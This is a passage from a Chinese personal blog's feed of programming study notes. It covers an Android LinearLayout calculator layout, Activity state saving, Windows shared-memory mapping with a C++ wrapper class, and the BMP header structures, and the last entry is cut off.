<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"vertical"</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span> </span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">       /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span> </span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:text</span>=<span class="string">"2"</span></span></span><br><span class="line"><span class="tag">     /&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">TextView</span> </span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:text</span>=<span class="string">"3"</span></span></span><br><span class="line"><span class="tag">     /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这段代码生成的样式：<br><img src="img1.jpg" alt="安卓线性布局"><br>这个是默认的，但是当我们将：<code>android:orientation=&quot;vertical&quot;</code>设置为：<code>android:orientation=&quot;horizontal&quot;</code>的时候我们的布局将会变成横向的分布了，我觉得这个就和Java的流布局差不多。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"vertical"</span> &gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">EditText</span> </span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:gravity</span>=<span class="string">"right"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_weight</span>=<span class="string">"4"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"9.0"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">LinearLayout</span> </span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:orientation</span>=<span class="string">"vertical"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_weight</span>=<span class="string">"12"</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">LinearLayout</span> </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:orientation</span>=<span class="string">"horizontal"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_weight</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">	        <span class="tag">&lt;<span class="name">Button</span> </span></span><br><span class="line"><span class="tag">	          <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_weight</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:text</span>=<span class="string">"7"</span>/&gt;</span></span><br><span class="line">	        <span class="tag">&lt;<span class="name">Button</span> </span></span><br><span class="line"><span class="tag">	          <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_weight</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:text</span>=<span class="string">"8"</span>/&gt;</span></span><br><span class="line">	        <span class="tag">&lt;<span class="name">Button</span> </span></span><br><span class="line"><span class="tag">	          <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_weight</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:text</span>=<span class="string">"9"</span>/&gt;</span></span><br><span class="line">	        <span class="tag">&lt;<span class="name">Button</span> </span></span><br><span class="line"><span class="tag">	          <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_weight</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:text</span>=<span class="string">"/"</span>/&gt;</span></span><br><span class="line">	    <span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">LinearLayout</span> </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:orientation</span>=<span class="string">"horizontal"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_weight</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">	        <span class="tag">&lt;<span class="name">Button</span> </span></span><br><span class="line"><span class="tag">	          <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_weight</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:text</span>=<span class="string">"7"</span>/&gt;</span></span><br><span class="line">	        <span class="tag">&lt;<span class="name">Button</span> </span></span><br><span class="line"><span class="tag">	          <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_weight</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:text</span>=<span class="string">"8"</span>/&gt;</span></span><br><span class="line">	        <span class="tag">&lt;<span class="name">Button</span> </span></span><br><span class="line"><span class="tag">	          <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_weight</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:text</span>=<span class="string">"9"</span>/&gt;</span></span><br><span class="line">	        <span class="tag">&lt;<span class="name">Button</span> </span></span><br><span class="line"><span class="tag">	          <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_weight</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:text</span>=<span class="string">"/"</span>/&gt;</span></span><br><span class="line">	    <span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">LinearLayout</span> </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:orientation</span>=<span class="string">"horizontal"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_weight</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">	        <span class="tag">&lt;<span class="name">Button</span> </span></span><br><span class="line"><span class="tag">	          <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_weight</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:text</span>=<span class="string">"7"</span>/&gt;</span></span><br><span class="line">	        <span class="tag">&lt;<span class="name">Button</span> </span></span><br><span class="line"><span class="tag">	          <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_weight</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:text</span>=<span class="string">"8"</span>/&gt;</span></span><br><span class="line">	        <span class="tag">&lt;<span class="name">Button</span> </span></span><br><span class="line"><span class="tag">	          <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_weight</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:text</span>=<span class="string">"9"</span>/&gt;</span></span><br><span class="line">	        <span class="tag">&lt;<span class="name">Button</span> </span></span><br><span class="line"><span class="tag">	          <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_weight</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:text</span>=<span class="string">"/"</span>/&gt;</span></span><br><span class="line">	    <span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br><span class="line">	    <span class="tag">&lt;<span class="name">LinearLayout</span> </span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:orientation</span>=<span class="string">"horizontal"</span></span></span><br><span class="line"><span class="tag">	        <span class="attr">android:layout_weight</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">	        <span class="tag">&lt;<span class="name">Button</span> </span></span><br><span class="line"><span class="tag">	          <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_weight</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:text</span>=<span class="string">"7"</span>/&gt;</span></span><br><span class="line">	        <span class="tag">&lt;<span class="name">Button</span> </span></span><br><span class="line"><span class="tag">	          <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_weight</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:text</span>=<span class="string">"8"</span>/&gt;</span></span><br><span class="line">	        <span class="tag">&lt;<span class="name">Button</span> </span></span><br><span class="line"><span class="tag">	          <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_weight</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:text</span>=<span class="string">"9"</span>/&gt;</span></span><br><span class="line">	        <span class="tag">&lt;<span class="name">Button</span> </span></span><br><span class="line"><span class="tag">	          <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:layout_weight</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">      		  <span class="attr">android:text</span>=<span class="string">"/"</span>/&gt;</span></span><br><span class="line">	    <span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Button</span> </span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:text</span>=<span class="string">"Clear"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_weight</span>=<span class="string">"3"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个布局今本上就实现了一个计算器，但是按钮需要铁姐大一点，这里比较重要的就是一个容器包含容器的一个思想，还有一点就是<code>android:layout_weight=&quot;3&quot;</code>这个样子的一个属性，这个属性就是权重的意思，就是说你的这个节点在这个容器中所占的比例差不多，权重都一样的话呢你这个节点就会像是平局你分给了你这个节点下的子节点。</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Activity保存恢复数据</title>
    <url>/2020/02/01/Activity%E4%BF%9D%E5%AD%98%E6%81%A2%E5%A4%8D%E6%95%B0%E6%8D%AE/</url>
    <content><![CDATA[<h1 id="Activity保存恢复数据"><a href="#Activity保存恢复数据" class="headerlink" title="Activity保存恢复数据"></a>Activity保存恢复数据</h1><p>有的时候我们在窗口转化的过程中，某些数据是不被保存的，例如在你旋转手的时候一些变量会不被保存，一些控件值不被保存，那该如何去做呢？</p>
<h2 id="控件数据丢失"><a href="#控件数据丢失" class="headerlink" title="控件数据丢失"></a>控件数据丢失</h2><p>这个很简单，主要是由于你的控件没有给出相应的控件ID所导致的，我们只需要将我们的控件编辑上我们的ID就好了。</p>
<h2 id="变量数据的丢失"><a href="#变量数据的丢失" class="headerlink" title="变量数据的丢失"></a>变量数据的丢失</h2><p>这个也不麻烦，但是需要的是保存我们重要的数据，我觉得用上一些Map集合是很方便的，例如在我们转换屏幕的方向的时候，数据就会重新刷新。<br>那么如何保存呢？我们可以重写<code>onSaveInstanceState</code>方法<br>例如：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onSaveInstanceState</span><span class="params">(Bundle outState)</span> </span>&#123;</span><br><span class="line">	<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">	outState.putString(<span class="string">"a"</span>, a);</span><br><span class="line">	<span class="keyword">super</span>.onSaveInstanceState(outState);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个时候我是保存了a变量，保存在”a”这个键值下面。<br>那么如何回复呢？其实有两种方法，一种是<code>onCreate</code>方法中进行恢复，一种是<code>onRestoreInstanceState</code>方法中进行恢复，两种方法都是可以的，但是这种情况下我们一般建议使用<code>onRestoreInstanceState</code>这个方法，其实是一样的，在我们这个方法被Java虚拟机调用的时候我们会传进来一个Bundle类型的一个参数，这个东西就有点像集合，也是键对值的一个操作，具体操作如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onRestoreInstanceState</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">	<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">	a = savedInstanceState.getString(<span class="string">"a"</span>);</span><br><span class="line">	<span class="keyword">super</span>.onRestoreInstanceState(savedInstanceState);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>onCreate</code>方法中也有那个Bundle参数，使用方法一样的。<br>记录一下这个Toast类，就是在窗口上提示一个小窗口：<br><code>Toast.makeText(getApplicationContext(),a+&quot;&quot;,Toast.LENGTH_SHORT).show();</code></p>
<p>很方便的一个小东西，但是就是太快了是不行的！</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>内存映射ShareMemory</title>
    <url>/2020/01/31/%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84ShareMemory/</url>
    <content><![CDATA[<h1 id="共享内存"><a href="#共享内存" class="headerlink" title="共享内存"></a>共享内存</h1><p>Windows下进程的地址空间在逻辑上是相互隔离的，但在物理上却是重叠的，就是说一块内存，可以给好多进程用，比若说共享内存进行读取，有点像管道奥。<br>今天还是照着书写的，可能在写这一张的人没怎么注意，还是有一个错误就是提前进行UnMap了。<br>我们首先看一下这个共享内存的简单实现：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> szName[] = <span class="string">"MemoryName"</span>;</span><br><span class="line">	<span class="keyword">char</span> szData[] = <span class="string">"123456789"</span>;</span><br><span class="line">	LPVOID  pBuffer;</span><br><span class="line">	HANDLE hMap = OpenFileMapping(FILE_MAP_ALL_ACCESS,<span class="number">0</span>,szName);</span><br><span class="line">	<span class="keyword">if</span>(hMap != <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		pBuffer = MapViewOfFile(hMap,FILE_MAP_ALL_ACCESS,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">		<span class="comment">//cout&lt;&lt;pBuffer&lt;&lt;endl;</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"读出数据%s"</span>,pBuffer);</span><br><span class="line">	&#125;<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		hMap = CreateFileMapping(INVALID_HANDLE_VALUE,<span class="literal">NULL</span>,PAGE_READWRITE,<span class="number">0</span>,<span class="built_in">strlen</span>(szData)+<span class="number">1</span>,szName);</span><br><span class="line">		pBuffer = MapViewOfFile(hMap,FILE_MAP_ALL_ACCESS,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">		<span class="built_in">strcpy</span>((<span class="keyword">char</span> *)pBuffer,szData);</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"写入数据"</span>&lt;&lt;szData&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	getchar();</span><br><span class="line">	UnmapViewOfFile(pBuffer);</span><br><span class="line">	CloseHandle(hMap);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先我们现实定义了一个数据名称和数据值，然后尝试打开这个内存映射，如果打开失败的话呢就是没有创建这个内存映射然后我们就开始创建，现实创建一个内存映射，然后在用<code>MapViewOfFile</code>进行内存地址的分配，然后再用<code>strcpy</code>进行数据的copy，然后就在这个时候，书上写的是吧<code>getchar()</code>卸载<code>CloseHandle</code>后面，但是这个样子就没有意义了，那么我们就应该先让他卡住才行，如果打开这个内存映射成功的话呢我们就读取这个内存映射的地址，然后输出，在这里需要注意不能用C++的一个输入输出流，因为我们定义pBuffer的时候我们不是定义的char类型，而是一个通用的指针类型，这里需要注意。</p>
<h2 id="CShareMemory类的封装"><a href="#CShareMemory类的封装" class="headerlink" title="CShareMemory类的封装"></a>CShareMemory类的封装</h2><p>在这里我们封装一下我们的内存共享类，方便之后的使用。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> __SHAREMEMORY_H__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> __SHAREMEMORY_H__</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CShareMemory</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	CShareMemory(<span class="keyword">const</span> <span class="keyword">char</span> *pszMapName,<span class="keyword">int</span> nFileSzie = <span class="number">0</span>,BOOL bSever = FALSE);</span><br><span class="line">	~CShareMemory();</span><br><span class="line">	<span class="function">LPVOID <span class="title">GetBuffer</span><span class="params">()</span><span class="keyword">const</span> </span>&#123;<span class="keyword">return</span> m_pBuffer;&#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	LPVOID m_pBuffer;</span><br><span class="line">	HANDLE m_hFileMap;</span><br><span class="line">	BOOL m_bSever;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">inline</span> CShareMemory::CShareMemory(<span class="keyword">const</span> <span class="keyword">char</span> *pszMapName,<span class="keyword">int</span> nFileSzie,BOOL bSever):m_hFileMap(<span class="literal">NULL</span>),m_pBuffer(<span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (bSever)</span><br><span class="line">	&#123;</span><br><span class="line">		m_hFileMap = CreateFileMapping(INVALID_HANDLE_VALUE,<span class="literal">NULL</span>,PAGE_READWRITE,<span class="number">0</span>,nFileSzie,pszMapName);</span><br><span class="line"></span><br><span class="line">	&#125;<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		m_hFileMap = OpenFileMapping(FILE_MAP_ALL_ACCESS,FALSE,pszMapName);</span><br><span class="line">	&#125;</span><br><span class="line">	m_pBuffer = (LPBYTE)MapViewOfFile(m_hFileMap,FILE_MAP_ALL_ACCESS,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">	m_bSever = bSever;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">inline</span> CShareMemory::~CShareMemory()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (m_bSever)</span><br><span class="line">	&#123;</span><br><span class="line">		UnmapViewOfFile(m_pBuffer);</span><br><span class="line">		CloseHandle(m_hFileMap);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span><span class="comment">//__SHAREMEMORY_H__</span></span></span><br></pre></td></tr></table></figure>
<p>和之前一样还是判断是否是重定义了，然后就是一个服务端几个客户端的类型，这个地方书上写的不是很严谨，我不知道是他没注意还是他就是这个意思，读他的析构函数的时候我发现，他并没有判断这个是不是服务器端还是客户端就进行了映射的关闭，我怀疑他是这个地方有点误解。<br>在这里写的时候他用了一个内联函数的方法进行写的，析构函数这个可以，但是这个构造函数我感觉其实是没啥必要，都这么多行了，是不是内联的都无所谓了我感觉（内联函数就是编译器直接拷贝，不需要进行函数的构造这种的），然后在函数后面有个const意思就是说，我们这个函数是不会修改这个成员变量的值的，参数有const的话呢就是说我们不会修改这个参数的值的。还有就是函数后面跟上<code>：</code>其实就是将后面的变量进行初始化，如果构造函数后面有的话呢一般来说就是父类的一个初始化了，这里比较特殊。</p>
]]></content>
      <categories>
        <category>Win32编程</category>
      </categories>
      <tags>
        <tag>Win32编程</tag>
      </tags>
  </entry>
  <entry>
    <title>内存映射-打开BMP图片</title>
    <url>/2020/01/31/%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84-%E6%89%93%E5%BC%80BMP%E5%9B%BE%E7%89%87/</url>
    <content><![CDATA[<h2 id="读取BMP图片"><a href="#读取BMP图片" class="headerlink" title="读取BMP图片"></a>读取BMP图片</h2><p>之前说到<code>LoadBitmap</code>这个函数用来加载一幅位图，现在正好复习到内存映射，就用内存映射来写这么一个相关的操作（这个我是照着书上写的，但是不知道那本书有点老还是QQ截图有问题，有地方我纠结了好一阵，后面说）。</p>
<p>首先我们想要原生态的打开BMP，也就是通过文件映射的方法打开BMP文件，那么我们至少要了解BMP文件的一个文件格式，这个文件格式和PE文件的很像，但是没有那个复杂，无非就是一些图片大小之类的一些信息。<br>我们要了解的结构体：</p>
<ol>
<li><p><code>BITMAPFILEHEADER</code>BMP图片头文件</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagBITMAPFILEHEADER</span> &#123;</span> <span class="comment">// bmfh </span></span><br><span class="line">    WORD    bfType; </span><br><span class="line">    DWORD   bfSize; </span><br><span class="line">    WORD    bfReserved1; </span><br><span class="line">    WORD    bfReserved2; </span><br><span class="line">    DWORD   bfOffBits; </span><br><span class="line">&#125; BITMAPFILEHEADER;</span><br></pre></td></tr></table></figure>
<p>结构体比较简单，比较重要的就是第一个和最后一个，第一个就是表示这个文件的一个类型，其实就和PE文件基本上一模一样，PE是MZ，BMP是BM，就是一个模子刻出来的。最后一个就是说真实的图片数据的RVA。</p>
</li>
<li><p><code>BITMAPINFO</code>BMP 图片信息</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagBITMAPINFO</span> &#123;</span> <span class="comment">// bmi </span></span><br><span class="line">    BITMAPINFOHEADER bmiHeader; </span><br><span class="line">    RGBQUAD          bmiColors[<span class="number">1</span>]; </span><br><span class="line">&#125; BITMAPINFO;</span><br></pre></td></tr></table></figure>
<p>这个的话呢里面比较重要的就是<code>bmiHeader</code>这个，里面还有一个结构体，这个结构体就是我们的信息了：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tagBITMAPINFOHEADER</span>&#123;</span> <span class="comment">// bmih </span></span><br><span class="line">    DWORD  biSize; </span><br><span class="line">    LONG   biWidth; </span><br><span class="line">    LONG   biHeight; </span><br><span class="line">    WORD   biPlanes; </span><br><span class="line">    WORD   biBitCount </span><br><span class="line">    DWORD  biCompression; </span><br><span class="line">    DWORD  biSizeImage; </span><br><span class="line">    LONG   biXPelsPerMeter; </span><br><span class="line">    LONG   biYPelsPerMeter; </span><br><span class="line">    DWORD  biClrUsed; </span><br><span class="line">    DWORD  biClrImportant; </span><br><span class="line">&#125; BITMAPINFOHEADER;</span><br></pre></td></tr></table></figure>
<p>这些信息就比较通俗易懂了，看名字就能看懂了。</p>
</li>
</ol>
<h2 id="程序编写"><a href="#程序编写" class="headerlink" title="程序编写"></a>程序编写</h2><p>首先在我们的程序窗口<code>OnCreate</code>的时候我们我们先去创建一个兼容的DC。</p>
